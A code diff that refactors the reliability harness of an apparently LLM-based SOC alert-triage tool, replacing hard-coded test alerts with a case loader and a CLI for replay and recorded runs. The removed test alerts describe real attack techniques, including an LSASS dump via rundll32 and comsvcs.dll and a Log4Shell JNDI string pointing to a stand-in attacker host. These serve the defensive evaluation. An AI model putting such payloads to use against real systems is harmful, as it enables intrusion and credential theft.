@@ -1,207 +1,109 @@
-"""Reliability harness: runs predefined alerts, validates triage output, prints summary.
+"""Reliability harness CLI.
 
-This is the required reliability/evaluation feature for the project. It serves
-as both an evaluation tool and a regression suite to detect drift in retrieval
-or LLM output quality.
+  python -m tests.harness.test_harness --replay              offline, no API key
+  python -m tests.harness.test_harness --record              live run, writes cassettes and results
+  python -m tests.harness.test_harness --record --update-baseline
 """
-import json
-import logging
-import time
-from pathlib import Path
-from typing import List, Dict, Any
+from __future__ import annotations
 
-from triage_engine.triage import SOCTriage  # v2 monorepo path; was: from triage import SOCTriage
+import argparse
+import logging
+import os
+import sys
+import time
+
+from tests.harness.loader import CaseLoadError, load_cases
+from tests.harness.metrics import compute_metrics
+from tests.harness.recorder import Budget, _git_sha
+from tests.harness.report import (
+    BASELINE, RESULTS, baseline_snapshot, diff_text, load_baseline, write_results,
+)
+from tests.harness.runner import build_retriever, evaluate_case, run_all  # noqa: F401  (evaluate_case re-exported)
 
 logging.basicConfig(level=logging.WARNING)
 
-
-TEST_CASES: List[Dict[str, Any]] = [
-    {
-        "id": "T1_phishing_credential_entry",
-        "alert": (
-            "User reported email from ceo@anthrop1c.com (note typo) requesting "
-            "urgent wire transfer to new vendor. User clicked link and entered "
-            "credentials before reporting. Email contained urgency language."
-        ),
-        "expect_severity_in": ["high", "critical"],
-        "expect_techniques_any": ["T1566"],
-        "expect_escalate": True,
-        "min_retrieval_score": 0.25,
-    },
-    {
-        "id": "T2_ransomware_active",
-        "alert": (
-            "Multiple file servers showing thousands of file modifications per minute. "
-            "Files renamed with .lockbit extension. README.txt ransom notes appearing "
-            "in every directory. Volume Shadow Copies deleted via vssadmin 30 minutes ago."
-        ),
-        "expect_severity_in": ["critical"],
-        "expect_techniques_any": ["T1486", "T1490"],
-        "expect_escalate": True,
-        "min_retrieval_score": 0.30,
-    },
-    {
-        "id": "T3_credential_dumping_lsass",
-        "alert": (
-            "EDR detected suspicious access to LSASS process memory by rundll32.exe "
-            "with comsvcs.dll on workstation WKSTN-042. User account is jsmith. "
-            "Process tree: cmd.exe -> rundll32.exe."
-        ),
-        "expect_severity_in": ["critical", "high"],
-        "expect_techniques_any": ["T1003"],
-        "expect_escalate": True,
-        "min_retrieval_score": 0.30,
-    },
-    {
-        "id": "T4_brute_force_ssh",
-        "alert": (
-            "5000 failed SSH authentication attempts in last 10 minutes against "
-            "host srv-bastion-01 from source IP 185.220.101.45 (known Tor exit). "
-            "No successful authentications observed yet."
-        ),
-        "expect_severity_in": ["high", "medium"],
-        "expect_techniques_any": ["T1110"],
-        "expect_escalate": True,
-        "min_retrieval_score": 0.25,
-    },
-    {
-        "id": "T5_log4shell_unverified_patch_claim",
-        "alert": (
-            "WAF detected JNDI string in HTTP User-Agent header to internal Java "
-            "application: jndi:ldap://attacker-domain.com/exploit. Source IP "
-            "is external. Application server is patched against CVE-2021-44228."
-        ),
-        "expect_severity_in": ["high", "medium", "low"],
-        "expect_techniques_any": ["T1190"],
-        "expect_escalate": True,
-        "min_retrieval_score": 0.25,
-    },
-    {
-        "id": "T6_gibberish_guardrail",
-        "alert": "asdfqwerzxcv 1234567890 lorem ipsum dolor sit amet",
-        "expect_severity_in": ["informational", "low"],
-        "expect_escalate": False,
-        "min_retrieval_score": 0.0,
-    },
-    {
-        "id": "T7_insider_exfil_departing",
-        "alert": (
-            "Employee jdoe (resignation notice given last week) downloaded 15GB of "
-            "customer data from CRM in last 24 hours. Login from new device "
-            "fingerprint. Email forwarding rule created to personal Gmail yesterday."
-        ),
-        "expect_severity_in": ["high", "critical"],
-        "expect_escalate": True,
-        "min_retrieval_score": 0.25,
-    },
-]
+# Legacy shape consumed by triage_engine.evaluation (dev console "Run live").
+try:
+    TEST_CASES = [c.to_legacy() for c in load_cases()]
+except CaseLoadError:  # surfaced properly by `loader --validate` and the CI gate
+    TEST_CASES = []
 
 
-def evaluate_case(result: Dict, case: Dict) -> Dict:
-    """Check a triage result against expected case criteria."""
-    checks = {}
-
-    checks["severity_match"] = result["severity"] in case["expect_severity_in"]
-
-    if "expect_escalate" in case:
-        checks["escalate_match"] = result["escalate"] == case["expect_escalate"]
-
-    if "expect_techniques_any" in case:
-        result_techs = set(result.get("mitre_techniques", []))
-        expected = set(case["expect_techniques_any"])
-        match = any(
-            any(rt.startswith(et) or et.startswith(rt) for rt in result_techs)
-            for et in expected
-        )
-        checks["techniques_match"] = match if result_techs else False
-
-    checks["retrieval_score_ok"] = (
-        result.get("retrieval_score", 0) >= case["min_retrieval_score"]
-    )
-
-    passed = all(checks.values())
-    return {"passed": passed, "checks": checks}
+def _select(cases, args):
+    if args.only:
+        cases = [c for c in cases if c.id in args.only]
+    if args.category:
+        cases = [c for c in cases if c.category == args.category or c.group.startswith(args.category)]
+    return cases
 
 
-def run_harness():
-    print("\n" + "=" * 70)
-    print("SOC TRIAGE AI: RELIABILITY HARNESS")
-    print("=" * 70)
-    print("Initializing system (loading corpus, indexing embeddings)...\n")
+def main(argv: list[str] | None = None) -> int:
+    ap = argparse.ArgumentParser(description="SOC Triage reliability harness")
+    mode = ap.add_mutually_exclusive_group()
+    mode.add_argument("--replay", action="store_true", help="replay cassettes, no API calls")
+    mode.add_argument("--record", action="store_true", help="live calls, write cassettes (default)")
+    ap.add_argument("--only", nargs="*", help="case ids")
+    ap.add_argument("--category", help="category or group prefix, e.g. phishing or adversarial")
+    ap.add_argument("--workers", type=int, default=4)
+    ap.add_argument("--max-cost-usd", type=float, default=5.0, help="hard cap for a live run")
+    ap.add_argument("--update-baseline", action="store_true")
+    ap.add_argument("--yes", action="store_true", help="skip the baseline confirmation prompt")
+    args = ap.parse_args(argv)
+    replay = args.replay
 
-    start = time.time()
-    triage = SOCTriage()
-    init_time = time.time() - start
-    print(f"System ready in {init_time:.1f}s\n")
+    try:
+        all_cases = load_cases()
+    except CaseLoadError as e:
+        print("\n".join(e.errors))
+        return 2
+    cases = _select(all_cases, args)
+    filtered = len(cases) != len(all_cases)
 
-    results = []
+    real_client, budget = None, None
+    if not replay:
+        key = os.getenv("ANTHROPIC_API_KEY")
+        if not key:
+            print("ANTHROPIC_API_KEY not set. Use --replay for an offline run.")
+            return 2
+        from anthropic import Anthropic
+        real_client, budget = Anthropic(api_key=key), Budget(args.max_cost_usd)
 
-    for case in TEST_CASES:
-        print(f"Running {case['id']}...")
-        case_start = time.time()
-        try:
-            result = triage.triage(case["alert"])
-            evaluation = evaluate_case(result, case)
-            elapsed = time.time() - case_start
-            results.append({
-                "id": case["id"],
-                "alert_excerpt": case["alert"][:100],
-                "severity": result["severity"],
-                "confidence": result["confidence"],
-                "escalate": result["escalate"],
-                "techniques": result.get("mitre_techniques", []),
-                "retrieval_score": result.get("retrieval_score"),
-                "sources": result.get("sources", []),
-                "passed": evaluation["passed"],
-                "checks": evaluation["checks"],
-                "latency_seconds": round(elapsed, 2),
-            })
-            status = "PASS" if evaluation["passed"] else "FAIL"
-            print(f"  [{status}] severity={result['severity']} "
-                  f"techs={result.get('mitre_techniques', [])} "
-                  f"score={result.get('retrieval_score')} "
-                  f"({elapsed:.1f}s)\n")
-        except Exception as e:
-            results.append({
-                "id": case["id"],
-                "passed": False,
-                "error": str(e),
-            })
-            print(f"  [ERROR] {type(e).__name__}: {e}\n")
+    print(f"{len(cases)} cases, mode={'replay' if replay else 'record'}")
+    t0 = time.time()
+    retriever = build_retriever()
+    print(f"retriever ready in {time.time() - t0:.1f}s")
+    results = run_all(cases, retriever, "replay" if replay else "record", workers=args.workers,
+                      real_client=real_client, budget=budget)
+    metrics = compute_metrics(results, cases)
 
-    # Summary
-    passed = sum(1 for r in results if r.get("passed"))
-    total = len(results)
-    avg_score = sum((r.get("retrieval_score") or 0) for r in results) / total
-    avg_latency = sum(r.get("latency_seconds", 0) for r in results) / total
+    for r in results:
+        tag = {"ok": "PASS" if r.get("passed") else "FAIL"}.get(r["status"], r["status"].upper())
+        print(f"  [{tag}] {r['id']} {r.get('error', '')}")
+    print(f"\nevaluated {metrics['evaluated']}/{metrics['total_cases']}  unrecorded {metrics['unrecorded']}  "
+          f"stale {metrics['stale']}  errors {metrics['errors']}")
+    print(f"standard {metrics['pass_rate_standard']}  adversarial {metrics['pass_rate_adversarial']}")
+    if budget:
+        print(f"live spend estimate: ${budget.spent_usd:.4f} ({budget.tokens_in} in, {budget.tokens_out} out tokens)")
 
-    print("=" * 70)
-    print("HARNESS SUMMARY")
-    print("=" * 70)
-    print(f"Passed:           {passed}/{total}")
-    print(f"Pass rate:        {100*passed/total:.0f}%")
-    print(f"Avg retrieval:    {avg_score:.3f}")
-    print(f"Avg latency:      {avg_latency:.1f}s")
-    print("=" * 70)
-
-    print("\nFailed cases (if any):")
-    failed = [r for r in results if not r.get("passed")]
-    if not failed:
-        print("  None")
-    for r in failed:
-        print(f"\n  [{r['id']}]")
-        if "error" in r:
-            print(f"    Error: {r['error']}")
-        else:
-            print(f"    Severity: {r.get('severity')} | Escalate: {r.get('escalate')}")
-            print(f"    Techniques: {r.get('techniques')}")
-            print(f"    Failed checks: {r.get('checks')}")
-
-    Path("tests/harness/harness_results.json").write_text(json.dumps(results, indent=2))
-    print(f"\nFull results: tests/harness/harness_results.json")
-
-    return passed, total
+    if not replay and not filtered:
+        meta = {"mode": "live", "recorded_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                "git_sha": _git_sha(), "model": "claude-sonnet-4-5",
+                "spend_usd_estimate": round(budget.spent_usd, 4) if budget else None,
+                "tokens_in": budget.tokens_in if budget else 0, "tokens_out": budget.tokens_out if budget else 0}
+        write_results(RESULTS, meta, results, metrics)
+        print(f"wrote {RESULTS}")
+        if args.update_baseline:
+            new = baseline_snapshot(results, metrics, meta["git_sha"])
+            print("\nBASELINE DIFF\n" + diff_text(load_baseline(), new))
+            if metrics["evaluated"] != metrics["total_cases"]:
+                print("refusing to update baseline: not every case was evaluated")
+                return 1
+            if args.yes or input("\nOverwrite baseline? [y/N] ").strip().lower() == "y":
+                import json
+                BASELINE.write_text(json.dumps(new, indent=2) + "\n", encoding="utf-8")
+                print(f"wrote {BASELINE}")
+    return 1 if metrics["stale"] or metrics["errors"] else 0
 
 
 if __name__ == "__main__":
-    run_harness()
+    sys.exit(main())
